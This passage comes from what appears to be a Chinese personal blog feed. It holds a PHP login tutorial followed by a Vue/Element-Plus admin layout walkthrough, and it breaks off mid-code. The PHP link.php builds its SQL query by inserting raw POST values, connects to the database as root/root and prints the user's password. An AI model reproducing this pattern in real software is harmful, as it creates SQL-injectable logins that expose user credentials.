class="keyword">for</span>=<span class="string">&quot;password&quot;</span>&gt;密码:&lt;/label&gt;&lt;/th&gt;</span><br><span class="line">      &lt;td&gt;&lt;input type=<span class="string">&quot;password&quot;</span> id=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> required&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">  &lt;/table&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;reset&quot;</span> value=<span class="string">&quot;重置&quot;</span>&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>link.php能够看懂，但是自己具体还是不会写，代码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type: text/html; charset=utf-8&#x27;</span>);<span class="comment">#这行代码设置响应的内容类型为 text/html，编码格式为 utf-8，确保向浏览器输出的内容能够正确显示中文等特殊字符。</span></span><br><span class="line"></span><br><span class="line">     <span class="variable">$u</span>=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">     <span class="variable">$p</span>=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$link</span>=<span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;192.168.249.140&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;security&quot;</span>)<span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">&quot;Error connecting&quot;</span>);</span><br><span class="line">     <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line">     <span class="variable">$sql</span>= <span class="string">&quot;select * from users where username=&#x27;<span class="subst">$u</span>&#x27; and password=&#x27;<span class="subst">$p</span>&#x27;&quot;</span>;</span><br><span class="line">     <span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>,<span class="variable">$sql</span>);</span><br><span class="line">   <span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$row</span>) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;your name :&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>]. <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;your password :&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">   &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;No matching user found.&#x27;</span>;</span><br><span class="line">    &#125;<span class="comment">#这段代码根据查询结果 $row 判断是否找到了匹配的用户记录。如果找到了，就输出用户名和密码；如果没找到，就输出 “No matching user found.”。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这两行代码分别粘贴到phpstudy的index.php和link.php。<br>如果哪一行出现错误就加上&#x2F;&#x2F;一个个进行查看。上面的两行代码都可以，再次点击网站，管理，打开网站就能看到如下界面，首先输入两个admin，这两个是在表里面显示上的都有。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702393094901-9052d50e-a2b5-4439-981d-54af17ec6820.png" alt="image.png"><br>点击登录就会发送请求到link.php网页上，此时登录成功就会显示如下结果：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702437480641-8218646f-20e6-4bbd-9f42-263d245a7de8.png" alt="image.png"><br>如果随便输入表格当中没有的就会产生报错输出的时候取消了字体的颜色：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702393727564-d5be7afe-10d3-412d-9b9c-3406845dfa45.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> php动态网站的实现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue的再次学习</title>
      <link href="/2023/12/17/vue%E7%9A%84%E5%86%8D%E6%AC%A1%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/12/17/vue%E7%9A%84%E5%86%8D%E6%AC%A1%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p> 上午：<br>复习vue的安装与使用<br>下载node.js npm慢的话用阿里云的 npm config set registry<br>接着就是创建项目vue-project1<br>打开项目，安装element-plus，分为下面两个步骤：<br>npm install element-plus –save<br>npm install -D unplugin-vue-components unplugin-auto-import<br>接着分别对main.js和vite.config.js进行配置<br>由于这些详细的配置过程在上一周已经学过，就简单的说一下。<br>这里注意一个问题：<br>main.js里面加入这行import ‘.&#x2F;assets&#x2F;main.css’#加入这行将会使按钮居中，不过问题不大，删除就好了。<br>试了一个红色按钮，成功了。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702338740796-cf8e7b2f-3659-46c1-8a24-9347abb14bcb.png" alt="image.png"><br>重点来了：<br>今天的vue学习主要是去综合使用vue和Evelent-UI去做一个页面并完成布局，下图是所要实现的效果图：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702306128125-d7d13d7d-5743-43ab-ad38-f5c8834cddad.png" alt="f1f299db411c6eeedbf4c6c5afb4ba8.png"><br>首先上述各项操作完成之后可以做个测试，不报错就成功，只需要对APP.vue进行编写就行：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702026551651-97483b2f-5bca-45e7-8f5a-685c7530351b.png"><br>以上操作做完APP.vue的布局就是这个样子的。</p><p>对整体以及侧边栏先进行布局<br>首先打开evelent-plus的官网，找到组件，之后找到布局容器<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702339181000-d843e4ab-2fc9-460e-8de4-cc7e433c7c67.png" alt="image.png"><br>将template和script的代码分别复制到对应位置，注意template的位置应该放在aside里面。<br>此时效果是这样的<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702339318612-934bdbad-1002-416e-b2b0-c8b06ced7cf5.png" alt="image.png"><br>接着找到evelent-plus的组件中的菜单，侧边栏<br>找到这款因为最接近：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702339417376-a91c449b-0dd7-4c31-8d6b-0a43642dffe8.png" alt="image.png"><br>也分别将template和script的代码分别复制到对应位置<br>script导入之后发现报错：原因是因为在整个菜单中采用的是ts，需要变成js才行。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">import &#123;</span><br><span class="line">  Document,</span><br><span class="line">  Menu as IconMenu,</span><br><span class="line">  Location,</span><br><span class="line">  Setting,</span><br><span class="line">&#125; from &#x27;@element-plus/icons-vue&#x27;</span><br><span class="line">const handleOpen = (key, keyPath) =&gt; &#123;</span><br><span class="line">  console.log(key, keyPath)</span><br><span class="line">&#125;</span><br><span class="line">const handleClose = (key,keyPath) =&gt; &#123;</span><br><span class="line">  console.log(key, keyPath)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>删除key和keyPath的“:value”此时能够运行成功<br>删掉下图中的第一个<el-col :span="12">以下的代码<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702340100461-76e37334-2c10-41ee-9f97-5d5a29655d97.png" alt="image.png"><br>将第二个的span值换成24，保证能占整个侧边栏的全屏<br>后面就去进行颜色以及设置class修改文字就可以了<br>完整的代码如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123; <span class="title class_">ElButton</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;element-plus&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Document</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Menu</span> <span class="keyword">as</span> <span class="title class_">IconMenu</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">User</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Shop</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Expand</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">PieChart</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Setting</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Ship</span>,</span></span><br><span class="line"><span class="language-javascript">&#125; <span class="keyword">from</span> <span class="string">&#x27;@element-plus/icons-vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> <span class="title function_">handleOpen</span> = (<span class="params">key, keyPath</span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(key, keyPath)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> <span class="title function_">handleClose</span> = (<span class="params">key, keyPath</span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(key, keyPath)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">el-aside</span> <span class="attr">class</span>=<span class="string">&quot;ce&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-row</span> <span class="attr">class</span>=<span class="string">&quot;tac&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">&quot;24&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-menu</span> <span class="attr">active-text-color</span>=<span class="string">&quot;#ffd04b&quot;</span> <span class="attr">background-color</span>=<span class="string">&quot;#334256&quot;</span> <span class="attr">class</span>=<span class="string">&quot;el-menu-vertical-demo&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">default-active</span>=<span class="string">&quot;2&quot;</span> <span class="attr">text-color</span>=<span class="string">&quot;#fff&quot;</span> @<span class="attr">open</span>=<span class="string">&quot;handleOpen&quot;</span> @<span class="attr">close</span>=<span class="string">&quot;handleClose&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-sub-menu</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">template</span> #<span class="attr">title</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">el-icon</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">User</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">span</span>&gt;</span>用户管理<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-menu-item-group</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;1-1&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">el-icon</span>&gt;</span><span class="tag">&lt;<span class="name">icon-menu</span> /&gt;</span><span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span>用户列表<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;1-2&quot;</span>&gt;</span>用户选择<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">el-menu-item-group</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-menu-item-group</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;1-3&quot;</span>&gt;</span>添加用户<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">el-menu-item-group</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-sub-menu</span> <span class="attr">index</span>=<span class="string">&quot;1-4&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">template</span> #<span class="attr">title</span>&gt;</span>删除用户<span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;1-4-1&quot;</span>&gt;</span>选择用户<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">el-sub-menu</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-sub-menu</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">el-icon</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Setting</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span>权限管理<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">el-icon</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Shop</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span>商品管理<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;4&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">el-icon</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Document</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span>订单管理<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;5&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-icon</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">PieChart</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span>数据统计<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">el-menu</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">el-row</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"> <span class="selector-class">.ce</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">15vw</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#334256</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.title</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">&#125; </span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里对与前面的标签也可以去element-plus里面去找，找完之后复制到相对应的位置，不要忘记在script里面也要进行添加，如何添加的上面代码已经进行了展示。<br>现在侧边栏已经做好了看看效果：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702340724163-bb31d940-ce1a-4605-aceb-cc88b7d1a9c6.png" alt="image.png"><br>将代码多留出几处空格，这个样子更方便去编写<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702340914156-80d118de-9797-43cc-885c-c8366a9131db.png" alt="image.png"><br>接着去做header部分：<br>header部分整体上可以用一个盒子，当成一行分为列进行编写：<br>这样将盒子的一行设置为三个部分三个8分别代表左，中，右三个位置<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702341192784-b6dd8198-aefa-4b7c-a212-037c27b8542f.png" alt="image.png"><br>之后就很简单了，按照给的要求进行编写，设置格式的就用class就行了标签就按照上图去进行添加就行。<br>代码如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;style-box&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-row</span> <span class="attr">class</span>=<span class="string">&quot;tac&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">&quot;8&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;text-align: left;font-isze: 20px;color: #000;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">el-icon</span>&gt;</span><span class="tag">&lt;<span class="name">Expand</span> /&gt;</span><span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span>首页 /用户列表<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">&quot;8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">&quot;24&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-icon</span>&gt;</span><span class="tag">&lt;<span class="name">Ship</span> /&gt;</span><span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">el-row</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.style-box</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">200vh</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">5vw</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: white;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: <span class="number">#000</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">box-shadow</span>: <span class="number">5px</span> <span class="number">5px</span> <span class="number">5px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.3</span>);</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.box</span>&#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">  </span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里的style-box是来设置阴影的。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702342153053-bc8968f9-be0e-4e1f-8788-295d6403b3a7.png" alt="image.png"><br>后面就是对main部分进行设置<br>首先是表格：<br>找到element-plus的table表格部分：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702342427095-ee3d4093-0c24-4d3d-b8fb-2eb45d79e820.png" alt="image.png"><br>选择这个，一样对template和script的内容进行复制，分别粘贴即可<br>如果script出现报错的话这说明有语句重复了删除一个就行，效果是这样的<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702342667636-4a83a650-a5cb-4b7c-ad10-a30fdcba79bb.png" alt="image.png"><br>接着设置分页：<br>一样是去element-plus进行查找<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702342753872-2c8c418e-5ed3-472e-921d-eeda7d4481a4.png" alt="image.png"><br>这个代码只需要后面部分就可以了<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702342888119-5e409a25-ab98-4e8b-b53e-0cab336f3e4b.png" alt="image.png"><br>这一串代码进行。效果就是这样。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702342916533-2ea71393-c7df-4677-a2bc-befa8c19e2a6.png" alt="image.png"><br>数据进行修改就去const tableData 里面进行修改：<br>这里对状态和操作需要单独添加按钮，也要注意添加相关的script信息，设置如图样式即可。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702343039197-9c754d4a-c62a-4271-95fc-5cf36faeaf75.png" alt="image.png"><br>整体上可以把header和main设置一个卡片card，整体的代码为：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123; <span class="title class_">ElButton</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;element-plus&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Document</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Menu</span> <span class="keyword">as</span> <span class="title class_">IconMenu</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">User</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Shop</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Expand</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">PieChart</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Setting</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Ship</span>,</span></span><br><span class="line"><span class="language-javascript">&#125; <span class="keyword">from</span> <span class="string">&#x27;@element-plus/icons-vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> <span class="title function_">handleOpen</span> = (<span class="params">key, keyPath</span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(key, keyPath)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> <span class="title function_">handleClose</span> = (<span class="params">key, keyPath</span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(key, keyPath)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Check</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Delete</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Edit</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Message</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Search</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Star</span>,</span></span><br><span class="line"><span class="language-javascript">&#125; <span class="keyword">from</span> <span class="string">&#x27;@element-plus/icons-vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123; ref &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> input = <span class="title function_">ref</span>(<span class="string">&#x27;&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> value1 = <span class="title function_">ref</span>(<span class="literal">true</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> value2 = <span class="title function_">ref</span>(<span class="literal">true</span>)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> tableData = [</span></span><br><span class="line"><span class="language-javascript">  &#123;</span></span><br><span class="line"><span class="language-javascript">    number : <span class="string">&#x27;1&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">name</span>: <span class="string">&#x27;Tom&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">email</span>: <span class="string">&#x27;123456@qq.com&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">phone</span>: <span class="string">&#x27;1234567890&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">people</span>: <span class="string">&#x27;实践&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">time</span>: <span class="string">&#x27;2016-05-02&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  &#123;</span></span><br><span class="line"><span class="language-javascript">    number : <span class="string">&#x27;2&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">name</span>: <span class="string">&#x27;Mary&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">email</span>: <span class="string">&#x27;1234567@qq.com&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">phone</span>: <span class="string">&#x27;123456789&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">people</span>: <span class="string">&#x27;嘎嘎&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">time</span>: <span class="string">&#x27;2016-06-01&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  &#123;</span></span><br><span class="line"><span class="language-javascript">    number : <span class="string">&#x27;3&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">name</span>: <span class="string">&#x27;jome&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">email</span>: <span class="string">&#x27;12345566@qq.com&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">phone</span>: <span class="string">&#x27;12345645789&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">people</span>: <span class="string">&#x27;哈哈&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span 